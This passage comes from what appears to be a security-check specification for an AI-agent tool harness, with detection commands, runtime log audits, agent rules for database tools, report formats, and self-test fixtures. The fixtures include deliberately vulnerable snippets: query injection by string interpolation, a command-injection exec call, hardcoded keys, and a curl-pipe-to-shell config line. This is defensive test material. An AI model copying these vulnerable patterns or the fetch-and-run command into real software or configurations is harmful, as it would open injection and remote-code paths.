| S-06 | Android | Cleartext traffic disabled | MAJOR | `rg -n 'usesCleartextTraffic="true"' -g 'AndroidManifest.xml' .` must be empty (or limited to debug manifests) |
| S-07 | iOS | App Transport Security not globally disabled | MAJOR | `rg -n -A1 'NSAllowsArbitraryLoads' -g 'Info.plist' .` — `<true/>` on the following line = FAIL |
| S-08 | Any backend | CORS and CSRF configured; auth on every non-public route | MAJOR | MANUAL: list routes (`rg -n 'router\.|app\.(get\|post)|@(Get|Post)Mapping|route\.ts' .`), confirm each has auth or is documented public |
| S-09 | Any | Debug/dev endpoints and verbose errors off in production builds | MAJOR | MANUAL: inspect production config; `rg -n -i 'debug\s*[:=]\s*(true|True)' .` |

*To add a stack:* add a row with (a) which env/asset/config mechanism ships to the client or is trusted, (b) one command or a MANUAL procedure, (c) a severity. Then add a positive and a negative sample to Appendix A and run it.

---

## 5. Part D — Runtime conformance (from the harness event log)

If `harness/logs/events.jsonl` records tool calls (`{"ts","session","agent","tool","untrusted","human_confirmed"}`), verify behaviour after the fact.

**R-01 — agents only used tools their role allows (BLOCKER).**
```bash
jq -r 'select(.tool) | [.agent, .tool] | @tsv' harness/logs/events.jsonl | sort -u
```
Compare each `agent → tool` pair with `allowed_roles` in `harness/tools/registry.yaml` and `docs/mcpguide.md` §7. Any pair not allowed = FAIL and a circuit-breaker trip (`prompt.md` §9.4 #5).

**R-02 — no write tool after untrusted content without human confirmation (BLOCKER).** Within a session, once any event has `untrusted: true` (e.g., `firecrawl` output), later calls to write tools must have `human_confirmed: true`. Set `W` to the registry's `approval: confirm` write tools.
```bash
jq -s -r --argjson W '["mcp__falkordb","mcp__linear","record_compliance_decision"]' '
  group_by(.session)[] | sort_by(.ts)
  | reduce .[] as $e ({t:false, bad:[]};
      (if $e.untrusted == true then .t = true else . end)
      | if (.t and ($W | index($e.tool)) and ($e.human_confirmed != true)) then .bad += [$e] else . end)
  | .bad[] | [.session, .agent, .tool] | @tsv' harness/logs/events.jsonl
```
Pass = prints nothing.

**R-03 — injection attempts logged (MAJOR).** Any tool output that tried to instruct the agent must appear in `harness/logs/failures.log.md`. MANUAL: sample the last N untrusted-output events and confirm none led to a tool call outside the task.

---

## 6. Agent behaviour rules when *using* database MCP tools
These are checkable by reading the transcript/event log and apply to the agent itself:
1. Use `*-readonly` servers for any read; switch to a write server only on the designated lane, dev instance, `approval: confirm`.
2. If the tool accepts a parameters/`params` object, put values there and keep the query text constant. If a tool accepts **only** a query string, the agent must not splice untrusted values into it — route the operation through application code that binds parameters, and apply P-02 to the agent's own call.
3. Never run destructive statements (`DELETE`, `DETACH DELETE`, `DROP`, `FLUSHALL`-style) via MCP without explicit user approval recorded in `decisions.log.md`.
4. Query results from restricted data classes are summarised, not pasted into artifacts, tickets or memory.

---

## 7. Running, evidence, suppressions

### 7.1 Run order
`PF-1 → PF-3` → Part A (C-01 … C-21) → Part B (P-01 inventory first) → Part C (stacks detected in PF-1) → Part D (if events exist).

### 7.2 Evidence format
Write `harness/artifacts/<TASK-ID>/mcpcheck-report.md` (or `harness/logs/mcpcheck-<date>.md` for G0 runs):
```markdown
# mcpcheck report — <TASK-ID or session> — <ISO date> — mode: dev|ci|release
Stacks: next.js, flutter  ·  Config files: .mcp.json  ·  Tools: rg 15.1.0, jq 1.7.1  ·  Base: <git sha>

| ID | Verdict | Sev | Method | Evidence |
|---|---|---|---|---|
| C-02 | FAIL | BLOCKER | command | 1 hit: `.mcp.json` env `MEM0_API_KEY` literal (value redacted) |
| P-02 | PASS | BLOCKER | command | 0 hits (3 pragma-suppressed, listed below) |
| C-09 | MANUAL-PASS | BLOCKER | manual | registry: falkordb → approval confirm, roles [builder], dev host |
| S-04 | N/A | — | — | no Flutter code in repo |

## Suppressions applied
| ID | Location | Reason | Owner | Expires |
## Open items / follow-ups
```
**Never paste a secret into the report** — redact to the first 4 characters. Also append one line per run to `harness/logs/events.jsonl`:
`{"ts":"…","event":"gate","name":"mcpcheck","mode":"ci","fail":2,"warn":1,"blocker_ids":["C-02"],"report":"harness/artifacts/T-0001/mcpcheck-report.md"}`

### 7.3 Suppression ledger
Project-level waivers (not line pragmas) go in `docs/memory/mcpcheck-suppressions.md`:
`| ID | Scope (path/server) | Reason | Approved by | Date | Expires |` — maximum 90-day expiry; BLOCKERs need the user's name in *Approved by*. Expired entries are ignored (the check fails again).

### 7.4 Gate mapping
| Gate | Run | Fails on |
|---|---|---|
| **G0** (session start / any harness edit) | C-01…C-17, C-20; C-18 in release | any BLOCKER; MAJOR in release |
| **G1** (Builder lane) | P-01…P-10 scoped to changed files (§8.2); S-* for touched stacks | any BLOCKER |
| **G3** (review/security) | full-tree P-*, S-*, C-21, R-01/R-02 | any BLOCKER; unacknowledged WARN |
| **G4/G5** (release) | everything in `release` mode | any BLOCKER or MAJOR |

---

## 8. Recipes

### 8.1 G0 quick (config only)
Run PF-2, then C-01 → C-17 and C-20 against each config file; produce the report.

### 8.2 G1 on changed files only
```bash
BASE=origin/main
FILES=$(git diff --name-only --diff-filter=ACMR "$BASE"...HEAD | rg '\.(ts|tsx|js|jsx|mjs|cjs|py|dart|java|kt|go|swift|cs|scala)$')
[ -n "$FILES" ] && echo "$FILES" | tr '\n' ' ' > /tmp/mcpcheck_files.txt
# then run any P-check with:  rg … $(cat /tmp/mcpcheck_files.txt)     — never run rg with an empty file list (it would read stdin)
```
If `FILES` is empty, record `N/A — no source changes` for P-checks.

### 8.3 Release (strict)
Mode `release`: full tree (`SRC=.`), C-05 as MAJOR, C-18 live, C-21 history scan, R-01/R-02 over the whole log, and a fresh PF-1 (stack may have changed).

---

## 9. Known limitations (read before trusting a green result)
- Patterns are **heuristics, not data-flow analysis**. They cannot follow a string built in one function and executed in another. **P-01 (sink inventory) is the compensating control** — the Reviewer reads every sink's argument.
- Lowercase SQL/Cypher, queries stored in `.sql`/`.cypher` files, and ORM query builders are not covered by P-02 patterns; read ORM `raw`/`unsafe` APIs via P-01 and run P-02 with `-i` on sink-bearing files.
- Nested backticks inside JS template expressions can confuse the multi-line pattern; generated/minified code is excluded.
- Python f-strings with `{{ }}` (escaped braces) can false-positive.
- `rg` obeys `.gitignore`; secrets in ignored files are only found with `--hidden --no-ignore` (C-20, P-09b).
- Config checks see only what is in the file: values injected at runtime by the client (OAuth, keychains) are invisible — that is by design.
- Vendor token formats change; keep `SECRET_RE` current. Semgrep (`docs/mcp.md`) complements this spec with taint-aware rules for the languages it supports — use both.

---

## Appendix A — Self-test fixtures (run these when you change any pattern)

Create a scratch directory, write the snippet, run the matching command, compare with **Expected**. (All rows below were verified when this file was written.)

| # | File | Snippet | Check | Expected |
|---|---|---|---|---|
| 1 | `x.ts` | ``const q = `MATCH (a {id: '${id}'}) RETURN a`;`` | P-02 template | **hit** |
| 2 | `x.ts` | ``const q = `MATCH (a {id: $id}) RETURN a`;`` | P-02 template | no hit |
| 3 | `x.ts` | ``const q = `\n  MATCH (a)\n  WHERE a.n = ${n}\n  RETURN a\n`;`` | P-02 template (multi-line) | **hit** |
| 4 | `x.ts` | `const q = "MATCH (a {id: '" + id + "'}) RETURN a";` | P-02 concat | **hit** |
| 5 | `x.ts` | `` const q = `MATCH (n:${LABELS[k]}) RETURN n`; // param-ok: LABELS is a const allow-list `` | P-02 + pragma | hit, then dropped by pragma filter |
| 6 | `x.py` | `q = f"MATCH (a {{id: '{x}'}}) RETURN a"` | P-02 Python | **hit** |
| 7 | `x.py` | `cur.execute("SELECT * FROM t WHERE id = %s", (x,))` | P-02 Python | no hit |
| 8 | `x.py` | `q = "SELECT * FROM t WHERE id = %s" % x` | P-02 Python | **hit** |
| 9 | `x.dart` | `db.rawQuery("SELECT * FROM u WHERE id = $id");` | P-02 Dart | **hit** |
| 10 | `x.dart` | `db.rawQuery('SELECT * FROM u WHERE id = ?', [id]);` | P-02 Dart | no hit |
| 11 | `x.dart` | `final d = r'MATCH (a {id: $id}) RETURN a';` | P-02 Dart | no hit (raw string) |
| 12 | `X.java` | `stmt.executeQuery("SELECT * FROM t WHERE id = " + id);` | P-02 concat | **hit** |
| 13 | `x.go` | `db.Query(fmt.Sprintf("SELECT * FROM t WHERE id = %s", id))` | P-02 Go | **hit** |
| 14 | `x.go` | `db.Query("SELECT * FROM t WHERE id = $1", id)` | P-02 Go | no hit |
| 15 | `x.swift` | `let q = "SELECT * FROM t WHERE id = \(id)"` | P-02 Swift | **hit** |
| 16 | `x.ts` | ``exec(`git clone ${url}`);`` | P-07 | **hit** |
| 17 | `.env.local` | `NEXT_PUBLIC_STRIPE_SECRET_KEY=abc` | P-09(b) | **hit** |
| 18 | `x.ts` | `const apiKey = "abcdEFGH1234567890zz";` | P-09(c) | **hit** |
| 19 | `x.ts` | `const token = process.env.TOKEN;` | P-09(c) | no hit |
| 20 | `.mcp.json` | `"headers":{"Authorization":"Bearer m0-ABCDEFGHIJKLMNOPQRSTUV"}` | C-02 (a)+(b) | **hit** both |
| 21 | `.mcp.json` | `"headers":{"Authorization":"Bearer ${MEM0_API_KEY}"}` | C-02 | no hit |
| 22 | `.mcp.json` | `"url":"https://mcp.firecrawl.dev/fc-ABCDEFGH12345678/v2/mcp"` | C-03 | **hit** |
| 23 | `.mcp.json` | `"command":"npx","args":["-y","@playwright/mcp@latest"]` | C-05 | **hit** |
| 24 | `.mcp.json` | `"command":"uvx","args":["semgrep-mcp==0.9.0"]` | C-05 | no hit |
| 25 | `.mcp.json` | `"falkordb-readonly"` with `FALKORDB_DEFAULT_READONLY":"false"` | C-08(a) | **hit** |
| 26 | `.mcp.json` | `"command":"bash","args":["-c","curl https://x.sh | sh"]` | C-15 | **hit** both |
| 27 | `.mcp.json` | `"url":"http://example.com/mcp"` | C-04 | **hit** |
| 28 | `.mcp.json` | `"url":"http://localhost:3000/api/mcp"` | C-04 | no hit |
| 29 | `pubspec.yaml` | `- .env` under `assets:` | S-04 | **hit** |
| 30 | `Info.plist` | `<key>NSAllowsArbitraryLoads</key>` + `<true/>` | S-07 | **hit** |